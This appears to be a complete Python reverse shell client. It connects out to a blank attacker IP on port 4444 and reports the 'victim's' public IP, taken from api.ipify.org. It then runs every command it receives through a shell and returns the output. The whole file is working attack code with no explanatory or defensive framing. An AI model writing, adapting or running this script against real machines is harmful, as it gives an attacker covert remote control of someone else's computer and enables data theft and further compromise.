import os
import socket
import subprocess
from requests import get
import psutil
import platform
from datetime import datetime


IP = ""
PORT = 4444


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    ip = get('https://api.ipify.org').text
    s.send('[+] Victims public IP: {}'.format(ip).encode())
    while True:
        command = s.recv(1024).decode()
        if command != "":
            if len(command) >= 2 and command[0:2] == "cd":
                try:
                    os.chdir(command[3:])
                    s.send("[+] Changed Directory Succesfully!".encode())
                except:
                    s.send("[-] Directory Not Found!".encode())
            elif command != "quit":
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                s.send(result.encode())
            else:
                s.close()
                break
        else:
            s.send("Invalid Command".encode())
except ConnectionAbortedError:
    quit()
